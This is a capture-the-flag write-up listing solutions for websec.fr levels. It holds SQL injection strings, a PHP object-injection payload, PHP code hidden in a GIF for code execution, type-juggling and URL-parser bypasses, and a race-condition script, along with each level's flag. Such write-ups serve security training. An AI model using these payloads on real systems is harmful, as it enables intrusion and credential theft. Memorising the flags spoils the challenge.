# Websec.fr-Writeups

## Level 1

```sql
0 union select id,password from users; --
```

```
WEBSEC{Simple_SQLite_Injection}
```

## Level 2

```sql
0 ununionion selselectect id,password frfromom users; --
```

```
WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
```

## Level 4

```php
$s = new SQL();
$s->SQL_query('select password as username from users;');
echo base64_encode(serialize(array("ip" => "109.186.77.58", "exploit" => $s)));

// a:2:{s:2:"ip";s:13:"109.186.77.58";s:7:"exploit";O:3:"SQL":2:{s:5:"query";s:39:"select password as username from users;";s:4:"conn";N;}}

// YToyOntzOjI6ImlwIjtzOjEzOiIxMDkuMTg2Ljc3LjU4IjtzOjc6ImV4cGxvaXQiO086MzoiU1FMIjoyOntzOjU6InF1ZXJ5IjtzOjM5OiJzZWxlY3QgcGFzc3dvcmQgYXMgdXNlcm5hbWUgZnJvbSB1c2VyczsiO3M6NDoiY29ubiI7Tjt9fQ==
```

```
WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```

## Level 8

PHP Injected in GIF

```php
GIF89a;

<?php
print_r(scandir("."));
?>
```

```php
GIF89a;

<?php
echo file_get_contents('flag.txt');
?>
```

```
WEBSEC{BypassingImageChecksToRCE}
```

## Level 17

Bypass strcasecmp by providing array instead of string

```yaml
"body": "flag[]=blabla&submit=Go"
```

```
WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}
```

## Level 25

Exploit url_parse function

```
https://websec.fr/level25/index.php?page=flag&:1337
```

```
https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
```

```
WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}
```

## Level 28

```
#!/usr/bin/env python3
import requests
import time

URL = "https://websec.fr/level28/tmp/"
FILE = "66b99941e5e007c9ceba59743b2a8270.php"

while True:
    res = requests.get(f"{URL}/{FILE}")
    if res.status_code != 404:
        print(res.text)
    else:
        print("NOPE")
    time.sleep(0.1)
```

```
<?php
include("../flag.php");
echo $flag;
?>
```

```
WEBSEC{Can_w3_please_h4ve_mutexes_in_PHP_naow?_Wait_there_is_a_pthread_module_for_php?!_Awwww:/}
```
